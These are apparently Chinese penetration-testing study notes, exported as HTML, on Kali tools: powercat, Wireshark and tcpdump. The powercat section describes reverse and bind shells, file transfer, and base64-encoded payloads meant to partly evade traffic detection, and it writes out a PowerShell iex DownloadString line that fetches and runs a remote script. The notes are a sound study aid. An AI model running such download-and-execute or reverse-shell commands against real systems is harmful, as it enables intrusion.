+<a name="5jnelikhn9q7lpikcvc87i47h6">&nbsp;&nbsp;&nbsp;&nbsp;https://docs.microsoft.com/en-us/powershell/</a>
+</h3>
+<h3 class="topic">
+<a name="4d1sk09e3qnvlv9q4jblh31nit">&nbsp;&nbsp;powercat</a>
+</h3>
+<h3 class="topic">
+<a name="6t1otdnrff2uvd2c6vbe9kurd1">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="0umh6np2hip30qcbus266ekq1b">&nbsp;&nbsp;&nbsp;&nbsp;Powercat本质上是besimorhino编写的Netcat的PowerShell版本。该脚本可以下载到Windows主机，以利用PowerShell的优势并简化绑定/反向shell的创建。</a>
+</h3>
+<h3 class="topic">
+<a name="7he70qqqg3mts94duel1ahlq2r">&nbsp;&nbsp;&nbsp;安装</a>
+</h3>
+<h3 class="topic">
+<a name="3gnhloos3lj4snbpnvonrbe1ti">&nbsp;&nbsp;&nbsp;&nbsp;可以使用apt install powercat将Powercat安装在Kali中，它将安装脚本放在/ usr / share / windows-resources / powercat中，之后将该脚本传输到目标windows系统中，即可在目标系统中使用powershell</a>
+</h3>
+<h3 class="topic">
+<a name="21amidi6vsut2rfo8amoiu2brv">&nbsp;&nbsp;&nbsp;使用</a>
+</h3>
+<h3 class="topic">
+<a name="3dno3a619qv0oas14c366sidvs">&nbsp;&nbsp;&nbsp;&nbsp;将脚本放在目标主机上，我们首先使用称为Dot-sourcing的PowerShell功能（其实就是.\脚名称）加载powercat.ps1脚本。 这将使脚本中声明的所有变量和函数在当前PowerShell范围中可用。 这样，我们可以直接在PowerShell中使用powercat函数，而不是每次都执行脚本。</a>
+</h3>
+<h3 class="topic">
+<a name="7792mvntcangivstvbchloabcp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行powershell脚本</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7acflfhs29lhkga0104gdum620.png"></p>
+<h3 class="topic">
+<a name="7saddtj863vcui4tu7pvk8rpan">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以下载该脚本并使用iex指令执行该脚本，值得注意的是，以这种方式加载的脚本仅在当前PowerShell实例中可用，并且每次重新启动PowerShell时都需要重新加载。</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1kts0nc1tvs1hck677r36q3uar.png"></p>
+<h3 class="topic">
+<a name="0fjl4o9gv2vdg7fdrmtpdippev">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')</a>
+</h3>
+<h3 class="topic">
+<a name="43vutlf4taji4tvnckurftum1k">&nbsp;&nbsp;&nbsp;&nbsp;脚本执行完毕后，被控制端就可以使用powercat中的指令了</a>
+</h3>
+<h3 class="topic">
+<a name="2kj4n2a6dh2316ijpvqj1g83at">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/570nq0noahusstp6pe00q1bote.png"></p>
+<h3 class="topic">
+<a name="43qnrmi3783samli48vpi8oqn9">&nbsp;&nbsp;&nbsp;文件传输</a>
+</h3>
+<h3 class="topic">
+<a name="5bup807smsemeuu86hpa4lo1ut">&nbsp;&nbsp;&nbsp;&nbsp;文件来源方</a>
+</h3>
+<h3 class="topic">
+<a name="4s25v0rhlj8co46j8uh9qluv9o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-c选项指定客户机模式并设置侦听IP地址，-p指定要连接的端口号，-i指示将远程传输的本地文件，即将需要被传输的文件发送到对应ip地址和对应端口</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2fmij3vt3j3fhgp4bum84b1hfp.png"></p>
+<h3 class="topic">
+<a name="5jtngbjqj8em3eku1k6qnrhqn5">&nbsp;&nbsp;&nbsp;&nbsp;文件接收方</a>
+</h3>
+<h3 class="topic">
+<a name="1pbifq1qf1hhj7oea1qe5vnfod">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建443端口的监听并将输入的数据重定向到对应文件中</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1of9m7s5tt2lnbjcvg9a5ku83e.png"></p>
+<h3 class="topic">
+<a name="21h6qk5tqep9qaqoj784tclpfn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接收方结束nc进程并判断文件是否传输完毕</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2g971jof569esr3oianlio08hu.png"></p>
+<h3 class="topic">
+<a name="1l4g14o72s345ghhqs72ln4vb5">&nbsp;&nbsp;&nbsp;反弹shell</a>
+</h3>
+<h3 class="topic">
+<a name="4b94b8a8au7uj2m0ha3kshrs1c">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="7b0nlrh01ps4p1lfopahvrl1km">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置监听</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6jhfbl5u97ribk88qlsdrs32pv.png"></p>
+<h3 class="topic">
+<a name="3fdmge5fm9boj17rngqkjmgppq">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="5o66bufmigmu33oj2nchsujqph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主动发送shell到控制端，-e指定连接成功时要执行的shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7d8i945sgh8oa0ih3rejdkab7u.png"></p>
+<h3 class="topic">
+<a name="0ish6rpuk6gfre5hpr18pkeoqv">&nbsp;&nbsp;&nbsp;bindshell</a>
+</h3>
+<h3 class="topic">
+<a name="13fe1c3fp5k85jds8gka3lkois">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="6983vhi44b4greu0sba0ioummf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-l表示监听 -p表示端口号 -表示链接发生时要执行的程序</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1mlg3jqc260s3br5d4q9ggjbi4.png"></p>
+<h3 class="topic">
+<a name="6mtf6nnjg8l77tvg44oj3rs8r9">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="1kv2dk3pq4c27j6c75iql4padf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用nc连接</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2gnv5r5dkf785p9m0ue1ogrifi.png"></p>
+<h3 class="topic">
+<a name="6h8qt681no6ufsh98984s8cd93">&nbsp;&nbsp;&nbsp;powercat payload</a>
+</h3>
+<h3 class="topic">
+<a name="60r4sf6pmebkc4j531knu9vcit">&nbsp;&nbsp;&nbsp;&nbsp;被控制端</a>
+</h3>
+<h3 class="topic">
+<a name="53mkfgclupifvivm9h9mgv885v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在反弹shell的基础上 -g选项将输出重定向到文件来创建独立的反向Shell有效payload，被控端可以执行该payload，此时payload未被加密，容易被检测到</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/0p3dleqhugq86a0f14adldq9b1.png"></p>
+<h3 class="topic">
+<a name="50g9sgv58uh39cu15ud9t9uvje">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生成未加密的反弹shellpayload保存在文件中</a>
+</h3>
+<h3 class="topic">
+<a name="7rlpn7kv8pldid76rhv9gbf2tq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的基础上，使用-ge选项可以生成base64编码后的payload，从而一定程度上避免被流量检测到</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1n1mrki0u9e1sn3nd1fcstb543.png"></p>
+<h3 class="topic">
+<a name="61pkco6kmflu2iac286n7ndss2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生成加密的反弹shellpayload保存在文件中</a>
+</h3>
+<h3 class="topic">
+<a name="29sih1mdmtbgrmr8a9f4hch30t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过powershell执行编码后的payload</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3qjirqr8t05m7qn1iv3fi1n9hf.png"></p>
+<h3 class="topic">
+<a name="37b73idgbuqtd99g0gbnpt2d79">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一步生成的脚本文件将包含可使用PowerShell -E（EncodedCommand）选项执行的编码字符串。 但是，由于-E选项被设计为在命令行上提交复杂命令的方式，因此，无法以与我们未编码的有效负载相同的方式来执行生成的encodereverseshell.ps1脚本。 相反，被控制端需要将整个编码后的字符串传递给powershell.exe -E：，从而执行payload，从而进行反弹shell</a>
+</h3>
+<h3 class="topic">
+<a name="453c2pq8job1b3abn30uikem7h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行payload，进行反弹shell</a>
+</h3>
+<h3 class="topic">
+<a name="56i8rp85onat5qg1ia2ddlkahb">&nbsp;&nbsp;&nbsp;&nbsp;控制端</a>
+</h3>
+<h3 class="topic">
+<a name="5hje0kk4gj5r5cv8utjo8it2of">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;监听端口，获得shell</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5e5i6cdvbs54id61rr1cimveao.png"></p>
+<h3 class="topic">
+<a name="08oppbk4td6qhro63rq6cha2ic">&nbsp;wireshark</a>
+</h3>
+<h3 class="topic">
+<a name="5f00rtuhoe223t16u79s58mj7s">&nbsp;&nbsp;基本结构</a>
+</h3>
+<h3 class="topic">
+<a name="1lit68equo0ps0d2j6n6tgfu4j">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/4ucat89r0qlft4empdjooiu3mi.png"></p>
+<h3 class="topic">
+<a name="0du7sna8c0glprpa6rc5votq4t">&nbsp;&nbsp;&nbsp;&nbsp;启动wrieshark（或通过图形界面）</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3hgpcrgrkgqqtgqcoobqr7jlr6.png"></p>
+<h3 class="topic">
+<a name="3avn69pmgh0l2fpsnkuldfr4j8">&nbsp;&nbsp;设置捕获过滤器</a>
+</h3>
+<h3 class="topic">
+<a name="3na99vnn8fcupkbrvdstc60c04">&nbsp;&nbsp;&nbsp;还可以通过导航到&ldquo;捕获&rdquo;&gt;&ldquo;捕获过滤器&rdquo;从预定义的捕获过滤器中进行选择，我们也可以通过单击+号来添加自己的捕获过滤器。 通过设置捕获过滤器，我们可以通过从可用接口列表中双击我们的网络接口（tap0）来开始捕获。</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5a2e035nmcc0men43t9586962f.png"></p>
+<h3 class="topic">
+<a name="13kui8iqottpg7bkv22g7vuelh">&nbsp;&nbsp;登陆ftp服务</a>
+</h3>
+<h3 class="topic">
+<a name="0gomqq1qloub81sc8slllki7t5">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1isp4rkm5lvbi3ru0un8jkgsnc.png"></p>
+<h3 class="topic">
+<a name="3j59t6bjr2vabtn7ks44lvv4hq">&nbsp;&nbsp;设置显示过滤器，从而仅显示ftp数据包</a>
+</h3>
+<h3 class="topic">
+<a name="14vuoff0uspridcr39k2d13iqe">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5oks66865bbchke20g16lrn4s8.png"></p>
+<h3 class="topic">
+<a name="0uphdepk8l2hno81at8jrbag7j">&nbsp;&nbsp;查看tcp数据流</a>
+</h3>
+<h3 class="topic">
+<a name="4r5tgb78dj5omdr35d0jf1qhhp">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7sv2n7hnaq5qmo2h4u63bblr44.png"></p>
+<h3 class="topic">
+<a name="3g0leklvuiiu9ligrnkicopt35">&nbsp;&nbsp;&nbsp;&nbsp;蓝色的是服务器端数据，红色的是客户端数据</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/6u4d6vbf8bhij7tu58kg43pk87.png"></p>
+<h3 class="topic">
+<a name="0p492ocs40qqqqveicgqtbato6">&nbsp;&nbsp;详细使用可见协议分析笔记</a>
+</h3>
+<h3 class="topic">
+<a name="7l5l9g4jev3d49quv5b4barev2">&nbsp;tcpdump</a>
+</h3>
+<h3 class="topic">
+<a name="0g08n632b491icv57lq2ump6mv">&nbsp;&nbsp;Tcpdump，一种命令行网络嗅探器，既可以捕获来自网络的流量，也可以读取现有的捕获文件</a>
+</h3>
+<h3 class="topic">
+<a name="67b0tdkuuq6s1250mnqtedvsa1">&nbsp;&nbsp;分析防火墙的捕获文件</a>
+</h3>
+<h3 class="topic">
+<a name="75cktb9t7rnrd4r94hopkcemgf">&nbsp;&nbsp;&nbsp;-r参数用于指定打开捕获文件</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1sq0kp7b6n61k7q2ed0nl92vp3.png"></p>
+<h3 class="topic">
+<a name="20eolfqnlebq9kls2sbk90vihq">&nbsp;&nbsp;&nbsp;-n：跳过DNS名称查找，-r指定捕获文件名，awk工具用户获得捕获文件中的目标地址和端口，并进行sort排序，通过uniq -c进行排序并计算该字段在捕获中出现的次数，最后使用head显示处前十行</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/63l4rhlfnrh74hneemin8qb2q3.png"></p>
+<h3 class="topic">
+<a name="7u3l6tmfm507oigo3h0rvlvcds">&nbsp;&nbsp;&nbsp;&nbsp;低目标端口（81）上联系了172.16.40.10，在高目标端口上联系了208.68.234.99，我们可以正确地假设前者是服务器，而后者是客户端。因为前者一直使用81端口进行连接，而后者则多次通过不同端口发起连接，且疑似使用所有端口依次尝试连接</a>
+</h3>
+<h3 class="topic">
+<a name="2srg79ban9n27ov2j8etvs6puk">&nbsp;&nbsp;&nbsp;使用过滤器对捕获文件中的数据包进行分析</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7pa1ig1d1rsrhfkif70uj337c6.png"></p>
+<h3 class="topic">
+<a name="28tisfqn7omo9t44dh7mogibt8">&nbsp;&nbsp;&nbsp;-X： 输出所捕获的数据包内容</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3itbs8hevv4sgrmn7ogkn4jtjv.png"></p>
+<h3 class="topic">
+<a name="5uvop77d33parcfkkfah2nnkmp">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/4ijqkvurb67tvdbjhk95v9rj64.png"></p>
+<h3 class="topic">
+<a name="6f26kqrar4cldlu1urn20ttkvq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-n：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。&#13;
+-X：输出包的头部数据，会以16进制和ASCII两种方式同时输出。</a>
+</h3>
+<h3 class="topic">
+<a name="1n3eqr5jgbmj701osu56rfs0bp">&nbsp;&nbsp;高级头部过滤</a>
+</h3>
+<h3 class="topic">
+<a name="6ggmi2b8leireb5s8ljvuuog53">&nbsp;&nbsp;&nbsp;网络数据的传输</a>
+</h3>
+<h3 class="topic">
+<a name="0snrtqasnarlm2f9lmbuoe9bce">&nbsp;&nbsp;&nbsp;&nbsp;FCS为校验和 简单的防火墙仅进行ip、端口的过滤，复杂的防火墙会对数据包中的数据进行解密、解压缩、嗅探、篡改等</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/321h0m997c0dg947rtjs4airbq.png"></p>
+<h3 class="topic">
+<a name="5udouqde5a6sgta9fuldtmdura">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TCP头，关键字段头部长度可以用于寻找tcp头之后的数据，还有源端口号和目的端口号，doff代表tcp头的长度</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/38864k68bkv3fl4fs1iolrjok5.png"></p>
+<h3 class="topic">
+<a name="1066pv8o572qnl63u4ooml81fn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所传输的tcp数据包类型</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/7u8b8ubupvalif9jmlnf98bmtm.png"></p>
+<h3 class="topic">
+<a name="6j01r5t6r189bdb6fmungokhle">&nbsp;&nbsp;&nbsp;&nbsp;UDP头，关键数据是源端口号和目的端口号</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1n8q0ouf5l8sdr9negpd7bmjfo.png"></p>
+<h3 class="topic">
+<a name="28p0ti7ajuaieqdgh011ccgddj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP头，其中最关键的数据是源ip地址、目标ip地址、协议（protocol：用于指定下一层是tcp协议还是udp协议）、ihl（该字段的值*4表示ip头的长度）</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/3gq6tsb624ut28qq3ad2doj67n.png"></p>
+<h3 class="topic">
+<a name="0lo5q2g4g56edqgrp9e30145ln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以太网帧头ETHERNET_FRAME，其中FrameType用于表示下一层是一个ARP包还是IP包，ARP包用于数据进入局域网后，根据ip地址找到mac地址&#13;
+&#13;
+ARP头ARP_HEADER，ARP头中存放源mac地址和目的mac地址</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/1daocveu7e97qkmlobn0hrsd2f.png"></p>
+<h3 class="topic">
+<a name="005f01g9ljnca8nng98pai2huu">&nbsp;&nbsp;&nbsp;数据包较多时，需要关注tcp数据包的类型，从数据包中筛选出指定类型的tcp数据包，此时需要根据tcp头部中的信息过滤数据包</a>
+</h3>
+<h3 class="topic">
+<a name="0tcfp9g8sgptai4mv91h9h5tf7">&nbsp;&nbsp;&nbsp;&nbsp;在最初的三向握手之后发送和接收的所有数据包都将设置ACK标志。PSH标志用于强制执行数据包的立即传送，并通常用于交互式应用程序层协议中以避免缓冲，所以筛选的目标往往时ack和psh类型的数据包</a>
+</h3>
+<h3 class="topic">
+<a name="2mqftjoool900hnp3fd339857o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp包头中的第14字节的数据用于表示tcp包类型，如果该字节为00011000，则该数据包为ack或psh类型，（00011000十进制为24）则该特征可以作为过滤条件</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/2nbb860d7pcm60r5j77pk15384.png"></p>
+<h3 class="topic">
+<a name="39nhjleobn3rmdci5b3n799dhr">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="kali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7_files/5p2p7f3q29063jq0ri4jnbkv0t.png"></p>
+<h3 class="topic">
+<a name="624agedje1hq9stks1bn754chp">&nbsp;&nbsp;&nbsp;&nbsp;-A：以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含网页数据的数据包时, 可方便查看数据</a>
+</h3>
+<h3 class="topic">
+<a name="5k690d4i7cagmv895ucos6crve">&nbsp;&nbsp;&nbsp;&nbsp;-n 'tcp[13] = 24'表示此时过滤条件为tcp头中第14字节数据为24，即当前tcp包为ack或psh类型(此时计数字节的tcpdump数组索引从零开始）</a>
+</h3>
+<h3 class="topic">
+<a name="4p4if1jd0i2dhq62sbo73sni6g">&nbsp;&nbsp;教程</a>
+</h3>
+<h3 class="topic">
+<a name="7632ihdi4a5j39f5juac7ad2nv">&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/d9162722f189</a>
+</h3>
+</body>
+</html>
